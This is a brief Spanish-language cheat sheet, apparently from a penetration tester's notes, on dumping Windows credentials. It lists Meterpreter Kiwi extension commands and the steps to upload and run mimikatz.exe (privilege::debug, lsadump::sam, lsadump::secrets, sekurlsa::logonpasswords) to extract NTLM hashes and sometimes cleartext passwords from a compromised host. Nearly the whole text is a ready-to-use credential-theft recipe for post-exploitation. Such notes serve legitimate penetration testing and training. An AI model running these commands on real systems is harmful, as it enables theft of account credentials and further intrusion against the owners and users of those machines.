# Mimikatz

Tags: #Windows #Mimikatz #DumpingHashes


Dentro de la sesión de Meterpreter usaremos la extensión de Kiwi para dumpear passwords. Pero debemos de ser 'NT Authority\\System'

## Dumpear los hashes

```bash 
❯ load kiwi                 # Cargamos la extension Kiwi

	❯ ?                    # Ver que comandos podemos usar 
	❯ creds_all            # Nos muestra todas las credenciales
	❯ lsa_dump_sam         # Nos muestra los hashes NTLM de los usuarios 
	❯ lsa_dump_secrets     # Nos muestra las credenciales a veces en texto claro 
```

También podemos cargar el archivo en la sesión de Meterpreter

```bash
❯ upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe 
❯ shell
❯ .\mimikatz.exe 

	❯ privilege::debug             # Nos debe de mostrar un 20 ok
	❯ lsadump::sam                 # Muestra mas informacion (ID, Hash)
	❯ lsadump::secrets             # Muestra las credenciales a veces en texto claro 
	❯ sekurlsa::logonpasswords     # A veces despliega passwd en texto claro
```


